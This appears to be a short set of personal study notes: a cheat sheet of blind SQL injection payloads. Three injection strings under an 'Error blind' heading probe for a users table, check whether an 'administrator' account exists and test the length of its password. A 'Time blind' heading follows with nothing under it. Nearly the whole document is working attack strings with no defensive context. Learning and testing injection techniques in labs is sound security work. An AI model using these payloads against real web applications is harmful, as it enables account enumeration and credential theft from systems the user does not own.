# 1. Error blind

  - ## i. check table name
        ' AND (SELECT 'a' FROM users LIMIT 1)='a
  - ## ii. check particular user if exist in users table
        ' AND (SELECT 'a' FROM users where username = 'administrator')='a
  - ## iii. Check specific column information
        ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password) = 20)='a

# 2. Time blind
